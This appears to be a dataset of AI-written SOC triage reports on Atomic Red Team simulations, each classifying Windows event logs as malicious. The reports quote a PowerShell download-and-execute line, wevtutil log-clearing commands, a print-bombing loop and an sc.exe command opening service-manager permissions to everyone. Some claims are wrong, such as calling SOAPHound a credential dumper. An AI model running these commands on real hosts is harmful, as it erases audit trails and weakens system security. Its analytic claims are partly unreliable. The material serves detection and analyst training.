SOAPHound - Dump BloodHound Data,"After a thorough examination of the provided event logs, several activities suggest potential malicious behavior:

### Analysis:
1. **Clearing of Event Logs:**
   - Multiple instances of logs being cleared are present, such as System, Windows PowerShell, and Security logs. The clearing of logs is reported under EventID 104 in the System log and a Security log event with EventID 1102. These actions were initiated by a user identified as `admin_test`. This is highly suspicious behavior commonly associated with attempts to cover tracks of unauthorized or malicious actions.

2. **Suspicious PowerShell Execution:**
   - The PowerShell log indicates the execution of a potentially malicious script using `powershell.exe` with specific command-line arguments that include the execution of `SOAPHound.exe`, a known tool associated with credential dumping (T1059.001). Such tools are typically used by attackers to gather sensitive information.

3. **Wevtutil Command Usage:**
   - The Sysmon logs show repeated execution of `wevtutil.exe` to clear logs across different channels, including Microsoft-Windows-Sysmon/Operational. This behavior supports the observation of log clearing mentioned above and is a characteristic technique for concealing malicious activity.

4. **Integrity Level and Execution Context:**
   - High Integrity Level executions by `admin_test` indicate the processes are running with elevated privileges. The use of high privilege access combined with the aforementioned activities raises concerns about privilege escalation attempts or misuse of credentials.

5. **Use of SOAPHound.exe:**
   - SOAPHound is executed from a path within the user's `AppData\\Local\\Temp\\AtomicRedTeam\\T1059.001\\bin`, typically associated with adversary simulation frameworks which are often used for testing security. However, its presence in this context without a known security exercise suggests unauthorized usage aligned with credential dumping activities.

6. **Hostname and Whoami Execution:**
   - Execution of `hostname.exe` and `whoami.exe` might be indicative of the attacker attempting to gather system information and confirm their current user context. While these commands are legitimate, in conjunction with other events, they suggest reconnaissance activity.

### Assessment:
Given the evidence of event log clearing, execution of a credential dumping tool, and high-integrity commands executed by a potentially compromised account, the logs indicate an active compromise of the system by a user with potentially stolen administrator credentials.

### Resolution:
**MALICIOUS** - The combined activities outlined in the logs clearly demonstrate malicious intent and execution, indicative of an active security incident.

### Recommendations:
1. **Immediate Action:**
   - Isolate the affected system (Server002) from the network to prevent further spread or data exfiltration.
   - Conduct a full forensic investigation, including memory and disk analysis, to determine the extent of compromise and the entry point.

2. **Credential Management:**
   - Reset credentials for `admin_test` and any other accounts possibly exposed.
   - Implement strict access controls and monitoring for admin accounts.

3. **Audit and Monitoring:**
   - Enable detailed logging and monitoring to detect similar activities and improve incident response readiness.
   - Review and harden security policies around PowerShell usage and execution of potentially dangerous utilities like `wevtutil.exe`.

4. **User Training & Awareness:**
   - Conduct refresher training for staff on security best practices, especially around password management and recognizing phishing attempts."
Simulate BlackByte Ransomware Print Bombing,"**Detailed Log Analysis**

The provided log entries from the various channels (System, Sysmon, Security, and Application) have several notable patterns and activities that suggest possible malicious behavior, particularly on a sensitive machine like the CEO's.

**1. Log Clearing Events:**
- **System Log (EventID 104 & Security Log EventID 1102):** The logs indicate that the security, system, and PowerShell logs were cleared by user `SERVER002\\admin_test`. This action is frequently associated with attackers attempting to hide their tracks after conducting malfeasance, as log clearing can erase evidence of unauthorized activity.

**2. Unusual Process and Command Executions:**
- **Sysmon Log Events:**
  - There are numerous entries related to `wevtutil.exe` (Eventing Command Line Utility) being used to clear logs, e.g., `wevtutil.exe cl System`, `wevtutil.exe cl Security`, and `wevtutil.exe cl ""Windows PowerShell""`. This further supports the intention to obscure or eliminate log entries.
  - **PowerShell activity (EventID 1):** A PowerShell session executed a long-running command using `cmd.exe` to repeatedly launch and execute multiple instances of `wordpad.exe` with specified documents in what seems to be an abnormal sequence. The command `powershell.exe & {cmd /c \""for /l %x in (1,1,75) do start wordpad.exe /p ...` denotes scripted or automated behavior that is abnormal for a CEO workstation.

**3. Repeated Use of Elevated Applications:**
- Repeated invocations of Microsoft Edge update services and related executables under the System account hint that processes are being manipulated or executed with system-level privileges. Though these processes are legitimate, their frequency and context may suggest misuse for privilege escalation or lateral movement.

**4. User and Process Anomalies:**
- The interaction patterns for `admin_test` are highly suggestive of an account being used for unauthorized administrative tasks. This includes high-privileged executions (`IntegrityLevel: High`) of processes like `powershell.exe`, `cmd.exe`, `conhost.exe`, and `wevtutil.exe`.

**Threats and Risks Identified:**
- Clearing of logs (system, applications, security) is indicative of active measures to cover tracks.
- Use of legitimate software utilities and administrative commands in potentially unauthorized ways indicates knowledge of the Windows operating system for malicious purposes.
- Automated or script-run sequences executing a legitimate application (`wordpad.exe`) in an abnormal volume and context suggest possible payload execution or testing.

**Guidance:**
- **Immediate Response Actions:**
  - Conduct a thorough investigation into the activities of the `admin_test` account, as this account is involved in actions typically associated with compromise.
  - Ensure that logging and security monitoring are re-enabled and gather as much forensic data as possible before escalation.
  - Quarantine or isolate the affected machine (Server002) to prevent further spread or data exfiltration.
  
- **Ongoing and Preventative Actions:**
  - Perform a security review and hardening of privileged accounts.
  - Implement alerting for critical log events such as log clearing and unusual PowerShell command execution.
  - Review and adjust user permissions and process execution policies, including the use of scripts and command-line utilities like `wevtutil`.

**Resolution:**
- **MALICIOUS**: The logs exhibit numerous indicators of compromise, including log clearing, abnormal process execution, potential unauthorized uses of elevated privileges, and large-scale automated execution of software under suspicious conditions.
"
Mirror Blast Emulation,"Based on the analysis of the provided logs, there are several key findings which indicate suspicious and potentially malicious activities on the investigated Windows host:

### Key Findings:
1. **Event Log Clearing:**
   - Several instances of the `wevtutil.exe` utility are used to clear logs, specifically targeting the Sysmon, Security, System, Application, and Windows PowerShell logs. This is indicative of an attempt to conceal malicious activity by erasing traces from the logs.

2. **Suspicious PowerShell Activity:**
   - PowerShell is executed with a command line that includes a potentially malicious script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1204.002\bin\mirrorblast_emulation.xlsm`. The use of PowerShell by attackers is common due to its flexibility and powerful scripting capabilities.

3. **Logon and Execution Context:**
   - All suspicious activities are executed under the user `SERVER002\admin_test` with high integrity level, suggesting potential privilege escalation or compromised credentials to perform high-level system operations.

4. **Time & Process Discrepancies:**
   - There are discrepancies in the timestamps within `svchost.exe` regarding the system time adjustments, though these may not directly indicate malicious activity, the context of the operations should be analyzed further.

### Conclusion:
The combination of log clearing, use of wevtutil.exe by a non-standard process (not typically associated with log management), and suspicious PowerShell activity points towards an attempted or actual compromise.

### Recommendation:
- **Immediate Action:**
  - Quarantine the affected system (Server002) from the network to prevent further compromise.
  - Perform a thorough forensic analysis of this system to confirm if there are other indicators of compromise not captured by the logs provided.

Encoded VBS code execution,"### Detailed Analysis of Windows Event Logs

#### Application Log
- The event logged by `Microsoft-Windows-Security-SPP` indicates a standard operation related to the Software Protection Platform. This does not raise any immediate concerns regarding malicious activity.

#### Windows PowerShell Log
- A PowerShell script is being executed with the command:
  ```powershell
  powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
  Invoke-Maldoc -macroFile ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1059.005\src\T1059.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Exec""}
  ```
- The `Invoke-Maldoc` script accesses a remote URL to download and execute a PowerShell script from the ""Atomic Red Team"" GitHub repository. The `Invoke-MalDoc` script is often used for testing malicious document behavior. Although this activity could be benign if used in a secured testing context, it is highly suspicious if not explicitly authorized.

#### Sysmon Log
- **Process Sequence:** Multiple suspicious process sequences are logged. The use of `wevtutil.exe` to clear logs is notably suspicious:
  - The `wevtutil.exe` command is used to clear event logs (Sysmon, Application, System, Security, and Windows PowerShell). Clearing logs is a common tactic used by attackers to hide tracks.
  
- **PowerShell Execution:** Multiple entries for `powershell.exe` running suspicious scripts are noted. Such activities can be potentially harmful especially in an operational environment, unless conducted in a controlled testing scenario.

#### Security Log
- **Log Cleared EventID 1102:** The security log was cleared by `admin_test`. This action is particularly concerning as clearing logs is a tactic often used post-exploitation.

#### System Log
- **Log Cleared EventID 104:** Similar to the Security log, the System log has been cleared by `admin_test`. This further intensifies the suspicion of malicious intent.

### Assessment
- **Indicators of Malicious Activity:**
  - Downloading and executing scripts from an external URL via PowerShell can be indicative of a phishing or remote code execution attempt.
  - Clearing multiple logs (Security, System, and Windows PowerShell) by `admin_test` is a strong indicator of potentially malicious activity aimed at covering tracks.

### Threats or Risks Identified
- **Potential Compromise:** There is a high risk of system compromise due to executed scripts that may have been downloaded and executed without proper validation or authorization.
- **Privilege Misuse or Escalation:** The account `admin_test` was used to clear system and security logs, indicative of privilege misuse or a potential compromise of the `admin_test` account credentials.

### Guidance on Proceedings
1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further potential malicious activities.
   - Conduct a thorough root cause analysis to determine if any payloads were executed and assess any system changes.
   
2. **Further Investigation:**
   - Review other hosts for similar activities particularly focusing on unauthorized PowerShell activities.
   - Audit user access for `admin_test` and review any suspicious behavior or anomalies related to that account.

3. **Remediation:**
   - Revert any unauthorized changes detected during the investigation.
   - Implement stricter logging and monitoring policies, including periodic review of high-value account activities like `admin_test`.

**Final Resolution: MALICIOUS**

The activity logged is highly indicative of malicious behavior, particularly due to unauthorized script execution and systematic clearing of event logs. This requires immediate response to mitigate potential threats."
PowerShell Session Creation and Use,"Based on the analysis of the provided logs, the following observations were made:

1. **Event Log Clearing:**
   - There are several `LogFileCleared` events in the logs (EventID 1102 in Security log and EventID 104 in System log). These events indicate that logs for the System and Security have been cleared. The `admin_test` account appears to be responsible for these actions. This behavior is a strong indication of malicious activity as clearing logs is a common tactic used to cover tracks.

2. **Execution of PowerShell Scripts:**
   - There is an execution of PowerShell with suspicious command-line parameters. Particularly notable is the use of PowerShell to create a session and execute commands that are commonly associated with T1086 (PowerShell) technique for execution or scripting tasks. This could potentially be part of a lateral movement or malware staging process.

3. **Unusual Process Execution:**
   - The logs show multiple invocations of `wevtutil.exe` to clear event logs for specific channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`). These are not usual administrative tasks and are often associated with efforts to evade detection.

4. **Anonymous Logon Events:**
   - The numerous occurrences of `ANONYMOUS LOGON` with event ID 4624 indicate potentially suspicious activity, especially in conjunction with other concerning activities. While anonymous logons may occur in certain scenarios, their presence here adds to the overall suspicion.

5. **High Integrity Level Tasks on Non-standard Activities:**
   - Various processes run at a high integrity level, such as `wevtutil.exe`, `powershell.exe`, and others, which further supports the hypothesis of an actor attempting to exert control over the system with elevated privileges.

In summary, the combination of log file clearing, suspicious PowerShell script execution, excessive anonymous logons, and high integrity level execution strongly suggest malicious intent and activity on the host.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - Isolate the affected host (Server002) from the network to prevent further compromise or lateral movement.
  - Preserve the current state of the system and gather forensic evidence for deeper analysis, which might involve obtaining disk images and memory captures.
  - Reset credentials for the `admin_test` account and any other potentially compromised accounts.

- **Investigative Actions:**
  - Conduct a thorough investigation to understand the full extent of the compromise and to identify any other potentially affected systems.
  - Review network logs and other endpoint logs for indicators of lateral movement or data exfiltration.

- **Remediation Steps:**
  - Implement necessary security measures, such as enhanced logging and monitoring, to detect similar activities in the future.
  - Apply security patches and update security tools to prevent known vulnerabilities from being exploited. 

- **Review Security Policies:**
  - Evaluate and update security policies, user access levels, and implement strict privilege management to avoid unauthorized access attempts in the future."
OSTap Payload Download,"Upon reviewing the provided Windows event logs, several activities emerge as potentially suspicious or anomalous. Below is a breakdown of these findings:

1. **Event Log Clearing (Event IDs: 1102, 104):**
   - Multiple events indicate the clearing of event logs by the user ""admin_test."" The use of `wevtutil.exe` to clear the Security, System, and Windows PowerShell logs (as seen in the Sysmon logs) is notably suspicious. Clearing logs is often an indication of an attempt to cover tracks.

2. **Suspicious Command Execution (Sysmon Event: Cmd.exe and Cscript.exe):**
   - The execution of a command that involves downloading a script from a URL (`raw.githubusercontent.com`) and executing a JavaScript file using `cscript.exe` implies potential malicious scripting activity. This behavior is common in scenarios where an actor attempts to execute a malicious script to gain further access or exfiltrate data.

3. **Multiple High-Privilege Tokens (Event ID: 4672):**
   - The SYSTEM account gains multiple high-privilege tokens, which is normal for system operations. However, in the context of the other suspicious activities, this could be correlating evidence that these privileges were being leveraged by potentially harmful scripts or processes.

4. **Repeated Credential Access Failures (Event ID: 5379 series):**
   - The repeated failure to access credentials for a Microsoft Account (ReturnCode: 3221226021) could either suggest a misconfiguration or repeated unauthorized attempts to access secure information.

5. **Sysmon Process Creations (Event IDs: Various, including 1 and 5):**
   - A notable number of process executions, notably involving svchost, wuauclt, and related executables often used in legitimate operations, are often leveraged in malicious activities due to their native presence on the Windows OS. The creation of task scheduler jobs and deletion of tasks appear unusual without further context.

In summary, the combination of log clearing, suspicious command execution with external script download, and unusual system-level process activities indicates a high likelihood of malicious activity. These behaviors collectively suggest an active attempt at concealment and possible compromise. 

**Assessment & Resolution:**

- **Resolution:** MALICIOUS
- **Threats Identified:** Possible unauthorized access attempt and script-based attack.
- **Risks:** System compromise, unauthorized data access, lateral movement within the network, persistent malicious scripts.
- **Guidance:** 
  - Immediately isolate the affected host to prevent potential further compromise.
  - Conduct a detailed forensic analysis to identify any additional compromised hosts.
  - Consider resetting credentials and enhancing monitoring on critical accounts.
  - Review and strengthen endpoint security measures, ensuring comprehensive EDR solutions are in place.

Further investigation is recommended to confirm, contain, and remediate the identified threat to prevent future occurrences."
ATHPowerShellCommandLineParameter -Command parameter variations,"### Detailed Analysis:

#### Anomalous Behavior Observed:
1. **Frequent PowerShell Execution:**
   - Multiple instances of PowerShell are executed by the user `SERVER002\admin_test` using the command line `powershell.exe & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop}`.
   - The command seems obfuscated, especially with a function like `Out-ATHPowerShellCommandLineParameter`, which is typically not part of standard PowerShell commands and strongly suggests malicious behavior often associated with attempts to execute obfuscated scripts or load modules in a stealthy manner.

2. **Event Log Clearing:**
   - Both the System and Security logs were cleared around the same time, which is a significant indicator of malicious activity, as attackers often clear logs to cover their tracks post-compromise.
   - User `admin_test` was responsible for clearing these logs, which is typically not a standard administrative operation without a legitimate reason.

3. **Utilization of Wevtutil.exe:**
   - `wevtutil.exe` is observed with commands to clear specific event logs like `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`. This aligns with attempts to tamper with system logs.
   - These actions by the user `SERVER002\admin_test` indicate deliberate log manipulation.

4. **Execution of whoami.exe and hostname.exe:**
   - These processes were executed, which are often used to gather information about the system environment in an unauthorized context.

5. **High Integrity Level Execution:**
   - The majority of activities executed were at a high integrity level, meaning that if compromised, the user has significant privileges to execute harmful actions across the system.

6. **WMI Provider Host (wsmprovhost.exe):**
   - Served as the parent process for many suspicious activities, which might indicate the misuse of WMI for remote command execution.

#### Indicators of Malicious Activity:
- The use of PowerShell with obfuscated commands and multiple instances cleared logs.
- Usage of `wevtutil.exe` for clearing logs systematically across various categories.
- Execution of processes such as `whoami.exe` and use of WMI/cmdlets to perform reconnaissance likely without authorization.

### Assessment:
The activities in the logs are consistent with behaviors seen in post-exploitation scenarios where the goal is stealth (through log clearing) and complete control (using PowerShell with high privileges). The indicators such as frequent PowerShell use with obfuscation, systematic log clearing, and system reconnaissance (execution of `whoami.exe` and `hostname.exe`) strongly suggest malicious intent and potential compromise.

### Resolution:
**MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation:**
   - Isolate the affected machine (`Server002`) from the network to prevent potential lateral movement.

2. **Forensic Analysis:**
   - Conduct a deep forensic analysis to understand the full scope of the compromise and ascertain any persistence mechanisms or lateral movements initiated from this machine.

3. **Credential Reassessment:**
   - Treat any credentials used on this machine as potentially compromised. Change all associated passwords and review accounts for any unauthorized permissions or additions.

4. **Review Security Measures:**
   - Implement stricter PowerShell logging and consider disabling or constraining PowerShell execution policies to reduce the risk of such activities.

5. **Use Endpoint Protection:**
   - Enhance endpoint detection and response capabilities to better identify such threats in the future.

6. **Security Awareness:**
   - Conduct training for users and administrators about recognizing signs of compromise and the importance of handling system logs appropriately."
AutoIt Script Execution,"Based on the provided event logs, let's analyze the potential indicators of malicious activity:

### Suspicious Behavior and Indicators:

1. **Log Clearing Activities:**
   - Multiple EventID 104 in the System log indicates that event logs have been cleared by the user `admin_test`. 
   - EventID 1102 in the Security log also shows log clearing activity.
   - The use of `wevtutil.exe` to clear logs is a behavior often associated with attempts to cover tracks after malicious actions. This is a significant red flag for potential malicious activity.

2. **Process Executions:**
   - In the Sysmon log, the frequent invocation of processes like `wevtutil.exe`, `conhost.exe`, and `powershell.exe` under the `admin_test` account is unusual.
   - Running `powershell.exe` with scripts in the `AtomicRedTeam` path is suspicious. It indicates the execution of scripts potentially testing attack techniques, common in penetration testing or adversarial simulation frameworks.
   - Usage of `AutoIt3.exe`, which is frequently used for automation or scripting tasks, also ties in with the suspicion if not expected on the CEO's machine.

3. **Privilege Usage:**
   - EventID 4672 shows the use of high-level privileges (`SeDebugPrivilege` and others) by the SYSTEM account, though this can be normal for some service activities; the context of it with log clearing is concerning.

4. **Account Credentials Access Monitoring:**
   - EventID 5379 indicates potential malicious attempts to access or enumerate credentials related to Microsoft accounts.
   - Repeated attempts to read credentials or perform other secured operations showing a consistent return of error codes (`3221226021`) may be indicative of attempted unauthorized activity.

### Assessment:

The combination of frequent log clearing, suspicious script execution using PowerShell, the execution of tools in paths like `AtomicRedTeam`, and credential access attempts strongly indicate potential malicious activity or a penetration test that was not authorized.

### Identified Threats/Risks:

- **Data Manipulation and System Tampering:** The clearing of logs suggests potential tampering with the evidence of malicious activities.
- **Credential Theft and Escalation Attempts:** Attempts to access Microsoft account credentials could be aiming for credential theft or lateral movement.
- **Execution of Unapproved Code:** Script execution indicates unauthorized or masked execution of potentially harmful code.

### Recommended Actions:

- **Immediate Investigation:** Gather more context around the `admin_test` activities to confirm if these actions align with authorized tasks.
- **Enhanced Monitoring:** Enable detailed monitoring and alerting for further suspicious actions, and specifically monitor for unauthorized uses of PowerShell or clearing of event logs.
- **Audit Scripts and Configurations:** Review any scripts or automation frameworks running, especially those related to `AtomicRedTeam`.
- **Incident Response Activation:** If not explained by authorized testing, escalate to the incident response team for full investigation and mitigation actions.

### Resolution:

**MALICIOUS -** Given the combined indications of log clearing, unauthorized script use, and suspicious credential access, the activity detailed in these logs is marked as malicious in nature. Immediate measures and deeper investigation are crucial."
Snake Malware Service Create,"Upon review of the provided Windows event logs, several indicators suggest potential malicious activity. Here is a detailed analysis:

1. **Event Log Clearing:**
   - In the security log entry, we see Event ID 1102 (""LogFileCleared""), which indicates the clearing of event logs by user `admin_test` on `SERVER002`. This action covers the tracks of the user activity, suggesting a potential attempt to hide malicious actions.
   - Sysmon logs also indicate multiple `wevtutil` executions with the ""cl"" command, which clears various logs (Sysmon, System, Security, and Windows PowerShell). These activities took place shortly before the logs were cleared based on timestamps, which aligns with potential malicious behavior to avoid detection.

2. **Process Execution:**
   - The Sysmon logs show suspicious process chains involving the creation of services and possible privilege escalation attempts. Importantly, a `cmd.exe` process attempts to create a service named ""WerFaultSvc"" with a potentially malicious or suspicious path through `sc.exe` (Event ID 1, Process ID 5928). The use of command line for service creation is not typical for legitimate applications and often indicates tampering or stealth mechanism by attackers.
  
3. **Suspicious Service Creation:**
   - The creation of a service named ""WerFault Service"" with a specific image path resembling a Windows component path is seen in the Sysmon logs and also verified by a System log entry (Event ID 7045). The use of `$env:windir` to point to system directories in this context is questionable and should be treated with suspicion.

4. **User Account Activity:**
   - The entire sequence of events is executed under the ""admin_test"" account, which raises suspicion when coupled with the use of Sysmon logging to hide actions and high integrity level processes suggesting administrative privileges.

### Conclusion:
Based on the analysis, the logs indicate attempts to cover tracks by clearing logs, unusual command-line service creation that could allow persistence or potential lateral movement, and attempts to hide actions, all under the guise of an administrative user.

Given these indicators, the resolution should be classified as **MALICIOUS**. This activity should be further examined with priority to confirm the intent, scope, and potential security breach. Immediate actions including isolating the system and conducting a comprehensive investigation for additional indicators of compromise should be taken. Further actions might include reviewing other systems for similar activity, identity audit trails, and reviewing all services and scheduled tasks on `SERVER002`."
Extract Memory via VBA,"Upon analyzing the logs, several indicators of suspicious and potentially malicious activity emerge, particularly in relation to the process execution and command-line activity recorded in the logs. Here's a detailed analysis of the findings:

### Suspicious Activities:

1. **PowerShell Execution with Unusual Script:**
   - There is a PowerShell execution with the command:
     ```
     ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, IEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing) , Invoke-Maldoc -macroFile \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1059.005\\src\\T1059_005-macrocode.txt\"" -officeProduct \""Word\"" -sub \""Extract\""}
     ```
   - This command is downloading and executing a script from the internet, applying a known technique commonly used in Red Team operations named ""Invoke-Maldoc"" from Red Canary's Atomic Red Team repository. Such activity is highly indicative of a deliberate test (like a penetration test) or a potential compromise if not authorized.

2. **Event Log Clearing:**
   - Multiple event logs (Sysmon, Security, Windows PowerShell, and System) have been cleared by the user `admin_test` which is a common tactic used by attackers to erase footprints post-compromise. This behavior is a red flag indicating attempted concealment of activities.

3. **Execution of System Commands with Administrator Privileges:**
   - There are multiple instances of system utilities like `wevtutil.exe` and `conhost.exe` being executed under the `admin_test` user context with high integrity level. While these programs can be used benignly, their execution context and proximity to other suspicious activity heighten their suspect nature.

4. **Usage of Windows Utilities in Succession:**
   - The repeated usage of Windows utilities like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, etc., suggests reconnaissance or script activity typical of automated tasks executed during system exploration or exploitation phases of an attack.

### Assessment of Findings:

The activities outlined exhibit behavior associated with penetration tests or security assessments, often involving PowerShell command-line interfaces, execution of scripts from a remote location, and use of system utilities. However, these same indicators, particularly the PowerShell script indicative of an Atomic Red Team test and the clearing of logs, could signal a potential real-world compromise or unauthorized activity.

### Resolution:

Given these observations and their alignment with known tactics, techniques, and procedures (TTPs) employed in both security assessments and malicious operations, the final resolution is:

**MALICIOUS**

This conclusion is reached due to the unauthorized clearing of logs, execution of potentially harmful scripts, and the presence of activities that rely on scripting languages to download and possibly execute payloads from dubious sources. Immediate action is recommended to:

1. **Isolate the system (Server002) to prevent further spread or lateral movement.**
2. **Conduct a thorough forensic analysis to determine the extent of the compromise.**
3. **Verify with all teams whether the activity was authorized as part of a security assessment.**
4. **Implement improved monitoring and alerting on PowerShell activities and critical system utilities.**
5. **Enhance user training on recognizing and handling suspicious emails and download activities, if relevant.**"
Maldoc choice flags command execution,"**Detailed Analysis**

**Indicators of Malicious Activity:**

1. **Event Log Clearing:**
   - Multiple Event IDs 104 in the System log and Event ID 1102 in the Security log indicate that someone with administrative privileges (username: ""admin_test"") cleared the event logs for the System, Security, and Windows PowerShell. This action is typically associated with attempts to cover tracks after performing unauthorized or suspicious activities.

2. **Suspicious PowerShell Activity:**
   - The Windows PowerShell log indicates that ""powershell.exe"" was executed with a command that downloads and executes a script from `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`. This script is known to be part of Red Canary's Atomic Red Team, a suite of penetration testing tools, essentially simulating malicious activities. The script further contains code to execute a macro in Word, which raises the suspicion of malicious office document handling.
   - The context of the command demonstrates potentially malicious behavior, as it attempts to execute commands on the system via PowerShell, which is a common attack vector for malware.

3. **Sysmon Log Corroboration:**
   - Sysmon logs show process execution events for PowerShell closely correlating with the log clearing events. The execution of wevtutil.exe (used for clearing logs) with the same administrative context provides further evidence of attempts to hide activities.
   - Additional processes such as `whoami.exe`, `hostname.exe`, and logging available changes within the PowerShell are indicative of reconnaissance activity, which often precedes further malicious actions.

**Assessment and Threats Identified:**

Given the combination of event log clearing, PowerShell script execution that is indicative of known testing/attack scripts, and various system administrative tools being used together, the logs strongly indicate the presence of malicious activity. Specifically, the PowerShell activity downloading and executing a known attack vector is a clear indicator of an attempted attack or compromise.

**Guidance on How to Proceed:**

1. **Resolution:** MALICIOUS
2. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further potential lateral movement or data exfiltration.
   - Investigate all other systems accessed by the credentials ""admin_test"" for similar log-clearing activities or suspicious behaviors.
3. **Further Analysis:**
   - Conduct a thorough forensic analysis of Server002, focusing on retrieved PowerShell scripts and identifying any additional payloads executed.
   - Review logs from other security devices (e.g., network logs) to trace any potential exfiltration or command-and-control traffic.
4. **Remediation:**
   - Change all potentially compromised credentials, especially those with administrative privileges.
   - Restore the system from a secure backup if evidence of persistent compromise cannot be cleared through direct remediation.

This analysis underscores the importance of monitoring suspicious PowerShell usage and detecting log manipulation attempts, which often accompany stealthy attacks."
OSTAP JS version,"Upon analysis of the provided Windows event logs, several indicators of malicious activity are present, particularly revolving around the use of PowerShell and attempts to clear logs. Here is a breakdown of the findings:

### Suspicious and Anomalous Behavior:

1. **PowerShell Activity:**
   - Multiple PowerShell logs indicate the execution of a script that attempts to download and execute a remote PowerShell script using `Invoke-MalDoc`. The script URL (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`) is a known malicious source associated with RedTeam exercises.

2. **Log Clearing:**
   - There are events indicating that the Sysmon, Application, Windows PowerShell, and Security logs have been cleared (`EventID 1102` for Security, and `EventID 104` for System and PowerShell). This behavior is often indicative of an attacker attempting to cover their tracks.

3. **Unusual Process Behavior and Execution:**
   - Execution of `wevtutil.exe` to clear event logs for several channels reads as:
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Application`
     - `wevtutil.exe cl System`
     - `wevtutil.exe cl Security`
     - `wevtutil.exe cl ""Windows PowerShell""`
   - The clearing commands were executed by the user `SERVER002\\admin_test`, which raises concern, especially under a high-integrity context.

4. **Use of JScript via WScript:**
   - Creating and executing a JScript file via `wscript.exe` is a common technique used by adversaries to execute malicious scripts on a Windows host.

5. **Execution Context:**
   - All malicious activities are executed under the `admin_test` user context, who possesses high integrity privileges, suggesting a potential compromised administrative account.

### Assessment:

The activity observed in the logs strongly suggests malicious intent and possible compromise of the system. The combination of downloading scripts from a known malicious repository, attempts to obfuscate actions through log clearing, and executing potentially harmful scripts all point towards an intrusion attempt or active exploitation.

### Resolution:

- **MALICIOUS**: The events captured in these logs unequivocally indicate malicious activities involving script execution and log manipulation to hide traces.

### Guidance on How to Proceed:

1. **Immediate Isolation:**
   - Isolate the machine (Server002) from the network to prevent further spread or command and control communication.

2. **Investigation:**
   - Conduct a thorough investigation into how the admin account was compromised.
   - Review other systems for similar indicators of compromise.

3. **Remediation:**
   - Remove unauthorized scripts and tools.
   - Change the credentials of compromised accounts.
   - Apply patches and updates to software and the operating system.

4. **Monitoring and Improvement:**
   - Implement stricter PowerShell execution policies.
   - Increase logging and monitoring for suspicious activities.
   - Consider additional training for users on security best practices.

This comprehensive approach will help mitigate the immediate threat and strengthen the system against future attacks."
Excel 4 Macro,"The analysis of the provided Windows event logs reveals several indicators of potentially malicious activity on the machine identified as ""Server002"". Here are the key findings and assessment:

### Suspicious and Anomalous Behaviors:

1. **Log Clearance:**
   - Events indicating the clearing of event logs (EventID 104 in System log and EventID 1102 in Security log) are a significant red flag. This behavior is often associated with threat actors attempting to cover their tracks.

2. **Usage of `wevtutil.exe`:**
   - Multiple executions of `wevtutil.exe` indicating log clearance (Sysmon EventID 1, 5). This utility is often used to clear event logs, a common tactic employed by attackers post-exploitation to evade detection.

3. **Irregular PowerShell Activity:**
   - Execution of a PowerShell script with complex and suspicious operations (as seen in the Sysmon EventID 1 for PowerShell and Windows PowerShell logs). The script involves manipulation of Excel objects and downloading a tool from an external source (`live.sysinternals.com/procexp.exe`). This hints towards an attempt to execute scripts or binaries not typically associated with daily administrative use.

4. **High Integrity Level:**
   - The processes are executed with a ""High"" integrity level, suggesting these operations are being performed with high privileges, which, combined with the suspicious activity, is concerning.

### Indicators of Malicious Activity:

- The combination of cleared logs, complex PowerShell script execution, and the timing of these events closely align with malicious behavior, particularly indicative of an attacker in control of the system attempting to hide his actions and maintain persistence.

### Assessment of the Situation:

**Resolution: MALICIOUS**

- The logs provide clear and multiple indicators of compromise. The systematic clearing of event logs using `wevtutil.exe`, combined with the execution of an obfuscated PowerShell script, suggests an attacker attempting to gain and maintain control of the system while evading detection.

### Recommendations on how to proceed:

1. **Immediate Isolation:**
   - Isolate the affected system (Server002) from the network to prevent any further spread or data exfiltration.

2. **Further Forensic Analysis:**
   - Conduct a full forensic investigation of the system to identify the point of compromise, extent of malicious access, and any additional persistence mechanisms or payloads.

3. **Remediation and Hardening:**
   - Remove any discovered payloads or malicious artifacts.
   - Apply necessary patches and configuration changes to harden the system against similar attacks in the future.

4. **Monitor and Review:**
   - Continuously monitor for any suspicious activities across other systems in the network.
   - Review existing security controls and logs to detect any other potential compromises or ongoing threats.

5. **Communication and Documentation:**
   - Document the findings, response actions, and measures for future reference and potential reporting requirements.

This assessment underscores the importance of vigilance in monitoring and analyzing system logs as part of a comprehensive cybersecurity strategy."
Modifying ACL of Service Control Manager via SDET,"Based on the provided Windows event logs, here is a detailed analysis highlighting suspicious and potential malicious activities:

1. **Log Clearing Events:**  
   - Security log and System log indicate event IDs 1102 and 104, respectively, which correspond to logs being cleared. This activity is typically suspicious because attackers may clear logs to cover their tracks. The UserData suggests that an account `admin_test` was involved in clearing these logs (`ClientProcessId: 3732`).
   - The use of `wevtutil.exe` to clear logs is further corroborated by the Sysmon logs, which show multiple instances of the command being executed to clear different event logs (Security, Application, System).

2. **Suspicious Command-Line Execution:**  
   - The use of `cmd.exe` to execute `sc.exe sdset scmanager D:(A;;KA;;;WD)` is a concerning activity. The command modifies the security descriptor of the service control manager, which could be leveraged to alter service permissions or service configurations maliciously. This could indicate a privilege escalation attempt or preparation for persistence mechanisms.

